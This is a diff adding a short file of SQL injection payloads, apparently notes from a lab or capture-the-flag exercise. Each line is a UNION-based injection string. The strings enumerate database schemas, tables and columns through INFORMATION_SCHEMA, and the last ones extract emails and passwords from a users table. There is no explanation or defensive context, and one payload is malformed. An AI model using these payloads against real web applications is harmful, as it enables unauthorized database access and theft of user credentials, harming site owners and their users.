@@ -1,0 +1,11 @@
+'UNION SELECT schema_name,3,3 FROM INFORMATION_SCHEMA.schemata#
+
+'UNION SELECT table_name'oten' FROM INFORMATION_SCHEMA.TABLES#; //SHOW ALL TABLES
+
+'UNION SELECT table_name,column_name,3 FROM INFORMATION_SCHEMA.COLUMNS# // SHOW ALL COLUMNS IN TABLE
+
+'UNION SELECT column_name,'test','test' FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'products';
+
+'UNION SELECT email, passwords, 3 FROM users#
+
+'UNION SELECT email,passwords,1 FROM users;	
